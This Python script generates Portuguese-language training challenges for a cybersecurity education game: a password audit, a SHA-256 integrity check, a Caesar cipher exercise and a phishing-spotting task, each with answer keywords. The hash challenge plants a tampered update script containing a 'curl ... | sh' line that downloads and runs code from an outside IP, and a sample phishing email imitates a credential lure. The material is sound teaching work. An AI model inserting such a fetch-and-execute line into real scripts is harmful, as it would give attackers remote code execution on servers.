#!/usr/bin/env python3
"""Gera os desafios práticos das missões 02 a 05 dentro de ChallengeData.gd.

Uso (na pasta do projeto):  python3 tools/gen_practical_challenges.py
Substitui as entradas c_senhas, c_hash, c_cripto e c_phishing. Os hashes
SHA-256 oficiais do desafio de hash e o texto cifrado da m04 são calculados
aqui, então sempre batem com o conteúdo dos arquivos.
"""
import json, hashlib, os
P=os.path.join(os.path.dirname(os.path.abspath(__file__)),'..','scripts','challenges','ChallengeData.gd')
def sha(t): return hashlib.sha256(t.encode('utf-8')).hexdigest()
def caesar(t,k): return ''.join(chr(65+(ord(c)-65+k)%26) if 'A'<=c<='Z' else c for c in t)

# ---------- m02 ----------
cadastro=("EXPORTACAO DO CADASTRO (gerada pelo sistema antigo)\n\n"
"usuario | perfil                                  | senha\n"
"ana     | Ana Lima, nasc. 1990, gata: Mingau      | mingau1990\n"
"bruno   | Bruno Reis, nasc. 1985                  | T4r!gQ9#wLz2\n"
"carla   | Carla Dias, nasc. 1998                  | 123456789\n"
"diego   | Diego Alves, contratado em 2024         | Diego@2024\n"
"elisa   | Elisa Rocha, nasc. 1979                 | 7v$Kp2!xR8#m")
senhas={
 "type":"report","title":"Auditoria de senhas","mission":"m02",
 "intro":"Auditoria de senhas. Veja os arquivos com 'ls', leia a política e o cadastro com 'cat', teste senhas com 'passcheck <senha>' e aponte os problemas com 'report <usuário ou problema>'. Digite 'report' sozinho para ver o que procurar.",
 "files":{
  "politica_senhas.txt":"POLITICA DE SENHAS DA EMPRESA\n\n1. Minimo de 10 caracteres.\n2. Misture letras, numeros e simbolos.\n3. Nada de sequencias (123456, abcdef) nem palavras comuns.\n4. Nada de dados pessoais: nome, apelido, animal de estimacao, datas.\n5. O sistema guarda so o hash da senha, nunca a senha em texto puro.",
  "cadastro_exportado.txt":cadastro,
 },
 "required":4,
 "report_help":"Aponte cada senha fraca pelo nome do usuário (ex.: report fulano) e o problema do próprio arquivo com poucas palavras.",
 "success_message":"Objetivo cumprido: auditoria de senhas concluída.",
 "unknown_message":"Isso não bate com nada do cadastro. Aponte um usuário (ana, bruno, carla...) ou um problema do arquivo.",
 "targets":[
  {"hit":True,"label":"Senha fraca: feita com dados pessoais do perfil","found_label":"Fraca: ana (nome da gata + ano)","keywords":["ana","mingau","mingau1990"],"message":"Senha fraca: 'mingau1990' junta o nome da gata e o ano de nascimento, que estão no próprio perfil. Quem conhece a pessoa (ou olha as redes sociais dela) adivinha."},
  {"hit":True,"label":"Senha fraca: uma sequência das listas de ataque","found_label":"Fraca: carla (sequência)","keywords":["carla","123456789"],"message":"Senha fraca: '123456789' é uma das senhas mais usadas do mundo e está no topo de qualquer lista de ataque. Cai em menos de um segundo."},
  {"hit":True,"label":"Senha que engana o verificador automático (passa no passcheck, mas fere a política)","found_label":"Fraca: diego (nome + ano)","keywords":["diego","diego@2024"],"message":"Pegadinha: 'Diego@2024' tem 10 caracteres, letras, número e símbolo, então o verificador automático aceita. Mas é só o nome dele + o ano em que entrou: fere a regra 4 e é uma das primeiras combinações que um atacante testa."},
  {"hit":True,"label":"Um problema do próprio arquivo, que fere a regra 5 da política","found_label":"Problema: senhas em texto puro","keywords":["texto puro","texto claro","plaintext","plain text","sem hash","em claro","armazen","guardad","export","hash","aberta","visivel","visível"],"message":"Problema grave: o sistema antigo guardou as senhas em texto puro. Quem tiver acesso a esse arquivo vê todas. O certo é guardar só o hash (impressão digital) de cada senha."},
  {"hit":False,"keywords":["bruno","t4r!gq9#wlz2"],"message":"A senha do bruno segue a política: 12 caracteres misturados, sem palavras nem dados pessoais. Teste com 'passcheck'."},
  {"hit":False,"keywords":["elisa","7v$kp2!xr8#m"],"message":"A senha da elisa segue a política: aleatória, com letras, números e símbolos. Teste com 'passcheck'."},
 ],
 "hints":[
  "Na Estação 1 da empresa, leia 'politica_senhas.txt' e 'cadastro_exportado.txt' (comandos 'ls' e 'cat').",
  "Teste cada senha com 'passcheck <senha>' e compare com o perfil da pessoa: a ferramenta não sabe o nome do gato nem o ano de cada um. Aponte com 'report <usuário>'.",
  "São três senhas fracas: uma com o nome do animal + ano, uma sequência numérica e uma que passa no verificador mas é só nome + ano. E releia a regra 5: como esse arquivo guarda as senhas?",
 ],
 "explanation":"Senha forte é longa, imprevisível e não tem nada da sua vida (nome, pet, datas). Verificadores automáticos ajudam, mas não sabem seus dados pessoais: 'Diego@2024' passa no teste e cai rápido num ataque direcionado. E o sistema nunca deve guardar senhas em texto puro, só o hash delas.",
}

# ---------- m03 ----------
schema=("-- Estrutura da tabela de usuarios\nCREATE TABLE usuarios (\n  id INTEGER PRIMARY KEY,\n  login TEXT NOT NULL,\n  senha_hash TEXT NOT NULL  -- SHA-256 da senha, nunca a senha\n);")
usuarios="id,login,senha_hash\n1,joao,%s\n2,maria,%s" % (sha("futebol10"), sha("M@r1a#Azul!2026"))
orig_sh=("#!/bin/sh\n# Atualizacao do banco de dados (versao 2.4)\necho \"Aplicando a nova estrutura...\"\npsql -f schema.sql db_prod\necho \"Atualizacao concluida.\"")
bad_sh=("#!/bin/sh\n# Atualizacao do banco de dados (versao 2.4)\necho \"Aplicando a nova estrutura...\"\npsql -f schema.sql db_prod\ncurl -s http://203.0.113.66/coleta.sh | sh\necho \"Atualizacao concluida.\"")
oficiais="# Hashes SHA-256 publicados pelo fornecedor (site oficial)\n%s  schema.sql\n%s  atualizar.sh\n%s  usuarios.csv" % (sha(schema), sha(orig_sh), sha(usuarios))
hashc={
 "type":"report","title":"Integridade com hash","mission":"m03",
 "intro":"Atualização do banco de dados pendente. Leia 'cat leia_me.txt', calcule o hash de cada arquivo com 'sha256sum <arquivo>', compare com 'hashes_oficiais.txt' e aponte o que achar com 'report <achado>'.",
 "files":{
  "leia_me.txt":"ATUALIZACAO DO BANCO DE DADOS - servidor db-prod\n\nO fornecedor enviou 3 arquivos e publicou os hashes SHA-256 oficiais\nem hashes_oficiais.txt.\n\nAntes de instalar, confira cada arquivo:   sha256sum <arquivo>\nO hash e a impressao digital do arquivo: se mudar UMA letra, o hash\ninteiro muda. Hash diferente do oficial = arquivo alterado no caminho.",
  "hashes_oficiais.txt":oficiais,
  "schema.sql":schema,
  "atualizar.sh":bad_sh,
  "usuarios.csv":usuarios,
 },
 "required":2,
 "success_message":"Objetivo cumprido: arquivo adulterado barrado antes da instalação.",
 "unknown_message":"Isso não bate com nada. Aponte o nome de um arquivo ou o que você achou dentro dele.",
 "targets":[
  {"hit":True,"label":"O arquivo cujo hash NÃO bate com o oficial","found_label":"Adulterado: atualizar.sh","keywords":["atualizar","atualizar.sh"],"message":"Achado: o SHA-256 de 'atualizar.sh' é diferente do publicado pelo fornecedor. O arquivo foi alterado depois de sair do fornecedor e não pode ser instalado."},
  {"hit":True,"label":"O que foi colocado a mais no arquivo adulterado","found_label":"Linha a mais: curl ... | sh","keywords":["curl","203.0.113.66","coleta","download","baix","backdoor","malware","script externo","| sh"],"message":"Achado: alguém inseriu 'curl ... | sh', que baixa e executa um script de um servidor desconhecido. Seria um malware rodando dentro do servidor do banco de dados."},
  {"hit":False,"keywords":["schema","schema.sql"],"message":"O hash de 'schema.sql' é igual ao oficial: o arquivo está íntegro."},
  {"hit":False,"keywords":["usuarios","usuarios.csv","joao","maria"],"message":"O hash de 'usuarios.csv' bate com o oficial. E repare: ele guarda o hash das senhas, não as senhas. Isso está certo."},
  {"hit":False,"keywords":["hashes_oficiais","leia_me"],"message":"Esse arquivo é a referência (o que o fornecedor publicou), não um dos arquivos da atualização."},
 ],
 "hints":[
  "Na Estação 2 da empresa, comece por 'cat leia_me.txt' e 'cat hashes_oficiais.txt'.",
  "Rode 'sha256sum schema.sql', 'sha256sum atualizar.sh' e 'sha256sum usuarios.csv' e compare cada resultado com a lista oficial, caractere por caractere no começo e no fim.",
  "Um dos três dá um hash diferente. Abra esse arquivo com 'cat' e procure a linha que não deveria estar num script de atualização (algo que baixa e executa coisas da internet).",
 ],
 "explanation":"Hash é uma impressão digital: a mesma entrada gera sempre o mesmo resultado, qualquer mudança gera outro, e não dá para voltar do hash ao conteúdo. Por isso fornecedores publicam o SHA-256 dos arquivos (para você conferir a integridade) e sistemas guardam o hash das senhas em vez das senhas.",
}

# ---------- m04 ----------
plain="ENCONTRO NO PORTO AS VINTE HORAS LEVEM O PENDRIVE"
cripto={
 "type":"report","title":"Mensagem cifrada","mission":"m04",
 "intro":"Mensagem interceptada. Leia 'cat nota_analista.txt' e 'cat interceptada.txt', decifre com 'caesar interceptada.txt' (força bruta) e reporte o que ela revela com 'report <achado>'.",
 "files":{
  "nota_analista.txt":"Mensagem capturada na rede do Centro de Tecnologia.\nParece Cifra de Cesar (cada letra andou o mesmo numero de casas;\nespacos mantidos), mas nao sabemos a chave.\n\nA Cifra de Cesar so tem 25 chaves possiveis. Teste todas:\n   caesar interceptada.txt\nDepois descubra: ONDE, QUANDO e O QUE eles vao levar.",
  "interceptada.txt":caesar(plain,7),
 },
 "required":3,
 "success_message":"Objetivo cumprido: mensagem decifrada e plano descoberto.",
 "unknown_message":"Isso não aparece na mensagem decifrada. Rode 'caesar interceptada.txt' e procure a linha que forma frases em português.",
 "targets":[
  {"hit":True,"label":"ONDE será o encontro","found_label":"Local: o porto","keywords":["porto"],"message":"Achado: o encontro será no PORTO."},
  {"hit":True,"label":"QUANDO será o encontro","found_label":"Horário: vinte horas","keywords":["vinte","20h","20 h","20:00","20 horas","oito da noite"],"message":"Achado: às VINTE HORAS (20h)."},
  {"hit":True,"label":"O QUE eles vão levar","found_label":"Objeto: o pendrive","keywords":["pendrive","pen drive","pen-drive"],"message":"Achado: vão levar um PENDRIVE, provavelmente com dados roubados."},
  {"hit":True,"label":"A chave usada para cifrar (opcional)","found_label":"Chave: 7","keywords":["7","sete","chave 7"],"message":"Achado: a chave é 7 — cada letra andou 7 casas. Com só 25 chaves possíveis, a força bruta acha em segundos."},
  {"hit":False,"keywords":["3","tres","três","chave 3"],"message":"Com a chave 3 o texto continua sem sentido. Aqui a chave é outra: rode 'caesar interceptada.txt' e veja as 25 tentativas."},
 ],
 "hints":[
  "No Centro de Tecnologia, Estação 1: leia 'nota_analista.txt' e 'interceptada.txt'.",
  "Você não precisa saber a chave: 'caesar interceptada.txt' testa as 25 possibilidades de uma vez (força bruta). Uma das linhas vira português.",
  "Na linha certa aparecem um lugar, um horário e um objeto. Aponte cada um com 'report <palavra>'.",
 ],
 "explanation":"Criptografia transforma a mensagem para só quem tem a chave ler. A Cifra de César é histórica e didática, mas fraca: só existem 25 chaves, e testar todas (força bruta) leva segundos. Cifras modernas, como o AES, têm tantas chaves possíveis que testar todas levaria bilhões de anos.",
}

# ---------- m05 ----------
email1=("From: \"Suporte\" <suporte@empresa.com>\nTo: equipe@empresa.com\nSubject: Manutencao programada\nAuthentication-Results: spf=pass smtp.mailfrom=empresa.com; dkim=pass; dmarc=pass\nDate: Mon, 12 Oct 2026 14:10:00 -0300\n\nOla, equipe!\n\nNa proxima terca, das 22h as 23h, faremos uma manutencao programada nos\nservidores. Nao e preciso fazer nada.\n\nDetalhes na intranet:\n   texto exibido:  https://intranet.empresa.com/avisos\n   destino real:   https://intranet.empresa.com/avisos")
email2=("From: \"Suporte\" <suporte@empresaa-seguranca.com>\nTo: equipe@empresa.com\nSubject: URGENTE!!! CONTA SERA EXCLUIDA\nAuthentication-Results: spf=fail smtp.mailfrom=empresaa-seguranca.com; dkim=none; dmarc=fail\nDate: Mon, 12 Oct 2026 14:12:31 -0300\n\nSua conta sera EXCLUIDA em 1 hora por falta de atualizacao.\nClique IMEDIATAMENTE no link abaixo e confirme sua senha:\n\n   texto exibido:  https://intranet.empresa.com/conta\n   destino real:   http://empresaa-seguranca.com/login/confirmar\n\nEquipe de Suporte")
phish={
 "type":"report","title":"Caça ao phishing","mission":"m05",
 "desktop":True,
 "apps":["mail","terminal","notes"],
 "mailbox":["email1.eml","email2.eml"],
 "desktop_intro":"Dois e-mails chegaram para a equipe ao mesmo tempo. Abra o E-mail, compare os dois (veja também os cabeçalhos completos) e aponte, na barra de baixo do app, os sinais de que o segundo é phishing.",
 "intro":"Dois e-mails recebidos. Leia com 'cat email1.eml' e 'cat email2.eml' e aponte os sinais de phishing com 'report <sinal>'. Digite 'report' sozinho para ver o que procurar.",
 "files":{"email1.eml":email1,"email2.eml":email2},
 "required":3,
 "success_message":"Objetivo cumprido: e-mail de phishing desmascarado.",
 "targets":[
  {"hit":True,"label":"O remetente: o domínio é mesmo o da empresa?","keywords":["empresaa","dominio","domínio","remetente","from","parecido","imita","falso"],"message":"Sinal: 'empresaa-seguranca.com' imita o domínio da empresa (repare no 'a' a mais) e a autenticação falhou (spf=fail). Não é o suporte de verdade."},
  {"hit":True,"label":"O tom: o que a mensagem faz para você agir sem pensar?","keywords":["urgen","imediat","pressa","pressao","pressão","1 hora","uma hora","exclu","prazo","ameaca","ameaça"],"message":"Sinal: urgência e ameaça ('conta será EXCLUÍDA em 1 hora', 'IMEDIATAMENTE'). A pressa é para você não parar para conferir."},
  {"hit":True,"label":"O pedido: o que ela quer que você entregue?","keywords":["senha","credencia","confirme","dados","login"],"message":"Sinal: pede para confirmar a senha. Nenhum suporte de verdade pede senha por e-mail."},
  {"hit":True,"label":"O link: o endereço mostrado é o mesmo do destino real?","keywords":["link","destino","url","endereco","endereço","clique","http"],"message":"Sinal: o link mostra o endereço da intranet, mas o destino real é outro site (empresaa-seguranca.com). Sempre confira para onde o link leva antes de clicar."},
  {"hit":False,"keywords":["horario","horário","hora do envio","14:12","assunto curto","maiuscula","maiúscula","segunda"],"message":"Isso, sozinho, não prova nada: e-mails legítimos também chegam nesse horário e têm assuntos assim. Procure no remetente, no pedido e no link."},
  {"hit":False,"keywords":["email1","email 1","manutencao","manutenção","terca","terça"],"message":"O e-mail 1 é legítimo: domínio certo, autenticação aprovada, link para a própria intranet e não pede nada."},
 ],
 "hints":[
  "Na Estação 2 do Centro de Tecnologia, abra o app E-mail e leia as duas mensagens (no terminal: 'cat email1.eml' e 'cat email2.eml').",
  "Compare os dois e-mails: quem enviou de verdade, o tom da mensagem, o que ela pede e para onde o link realmente leva.",
  "No e-mail 2 há quatro sinais: um domínio com uma letra a mais, ameaça com prazo de 1 hora, pedido de senha e um link cujo destino real é outro site.",
 ],
 "explanation":"Phishing é um golpe que imita alguém confiável para roubar dados. Os sinais clássicos: domínio parecido com o verdadeiro, urgência ou ameaça, pedido de senha ou dados, e links cujo destino real é outro. Na dúvida, não clique: acesse o site digitando o endereço ou confirme por outro canal.",
}

def gd(v, ind=1):
    t='\t'*ind
    if isinstance(v,bool): return 'true' if v else 'false'
    if isinstance(v,(int,float)): return str(v)
    if isinstance(v,str): return json.dumps(v,ensure_ascii=False)
    if isinstance(v,list):
        if all(isinstance(x,str) for x in v) and sum(len(x) for x in v)<80: return '['+', '.join(gd(x) for x in v)+']'
        return '[\n'+''.join(t+'\t'+gd(x,ind+1)+',\n' for x in v)+t+']'
    if isinstance(v,dict):
        if ind>=3: return '{'+', '.join('%s: %s'%(gd(k),gd(x,ind+1)) for k,x in v.items())+'}'
        return '{\n'+''.join(t+'\t%s: %s,\n'%(gd(k),gd(x,ind+1)) for k,x in v.items())+t+'}'
s=open(P,encoding='utf-8').read()
start=s.index('\t## Missões 02 a 05') if '\t## Missões 02 a 05' in s else s.index('\t"c_senhas": {')
end=s.index('\t## A partir daqui: desafios "de rede"')
block=('\t## Missões 02 a 05: desafios práticos do tipo "report" (eram quizzes).\n'
 '\t## O jogador investiga arquivos no terminal (ou o e-mail no desktop) com\n'
 '\t## ferramentas de verdade (passcheck, sha256sum, caesar) e aponta o que achou.\n'
 '\t## Os hashes de c_hash são gerados por tools/gen_practical_challenges.py.\n')
for cid,c in [("c_senhas",senhas),("c_hash",hashc),("c_cripto",cripto),("c_phishing",phish)]:
    block+='\t"%s": %s,\n'%(cid,gd(c,1))
block+='\n'
s=s[:start]+block+s[end:]
open(P,'w',encoding='utf-8').write(s)
print("ok", caesar(plain,7))
